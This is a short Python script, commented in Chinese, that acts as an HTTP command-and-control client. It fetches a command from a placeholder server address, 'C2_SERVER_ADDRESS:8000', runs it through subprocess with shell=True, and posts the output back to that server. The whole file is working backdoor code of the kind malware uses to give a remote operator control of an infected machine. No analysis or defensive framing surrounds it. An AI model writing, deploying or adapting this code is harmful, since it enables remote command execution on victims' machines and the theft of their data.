import subprocess
import requests

# 透過 HTTP 進行 command and control
def http_c2(url):
    try:
        # 從指定的 URL 取得命令
        response = requests.get(url)
        command = response.text
        # 執行命令
        result = execute_command(command)
        # 將結果回傳到指定的 URL
        requests.post(url, data=result)
        
    except Exception as e:
        print("Error: %s" % str(e))

# 使用 subprocess 模組執行命令
def execute_command(command):
    output = subprocess.check_output(command, shell=True)
    return output

# 呼叫方法
http_c2("http://C2_SERVER_ADDRESS:8000/command")